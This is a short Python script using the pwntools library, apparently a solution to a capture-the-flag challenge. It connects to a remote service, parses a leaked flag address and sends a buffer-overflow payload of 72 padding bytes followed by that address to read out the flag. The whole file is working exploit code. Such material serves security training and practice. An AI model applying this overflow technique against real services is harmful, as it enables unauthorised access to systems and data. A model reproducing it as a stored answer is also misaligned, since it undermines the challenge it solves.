#!/usr/bin/python3

from pwn import *

host = ''


conn = remote(host, 443, ssl=True, sni=host)

# Receive the initial information
received_data = conn.recvuntil(b"Give me your input:")

# Convert received data to string
received_data = received_data.decode('utf-8')
print(received_data)

# Extract the flag address and pointer address
flag_address_start = received_data.index("The flag is stored at ") + len("The flag is stored at ")
flag_address_end = received_data.index("\n", flag_address_start)
flag_address = received_data[flag_address_start:flag_address_end]

pointer_address_start = received_data.index("Your pointer is pointing at ") + len("Your pointer is pointing at ")
pointer_address_end = received_data.index("\n", pointer_address_start)
pointer_address = received_data[pointer_address_start:pointer_address_end]

flag_address = int(flag_address, 16)
print("Flag address:", flag_address)
print("Pointer address:", pointer_address)



# Generate the input
input_data = b'A' * 72 
input_data += p64(flag_address)

# Send the input to the server
conn.sendline(input_data)

received_flag = conn.recv().decode()
print(received_flag)

conn.interactive()
